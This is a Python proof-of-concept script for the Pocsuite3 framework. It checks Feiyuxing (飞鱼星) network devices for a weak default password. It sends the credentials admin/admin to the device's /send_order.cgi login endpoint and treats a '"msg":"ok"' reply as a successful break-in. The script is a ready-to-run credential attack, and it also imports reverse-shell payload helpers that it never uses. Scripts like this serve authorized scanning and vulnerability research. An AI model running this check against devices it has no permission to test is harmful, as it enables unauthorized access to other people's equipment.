# _*_ coding:utf-8 _*_
# @Time : 2024/2/20
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class feiyuxing_ruokl(POCBase):
    pocDesc = '''飞鱼星 弱口令'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-20'
    name = '飞鱼星 弱口令漏洞'
    #body = "../img/R1/loginbg.jpg"


    def _verify(self):

        result = {}
        url = self.url+ '/send_order.cgi?parameter=login'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        }
        try:

            data = '{"username":"admin","password":"admin"}'
            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and '"msg":"ok"' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(feiyuxing_ruokl)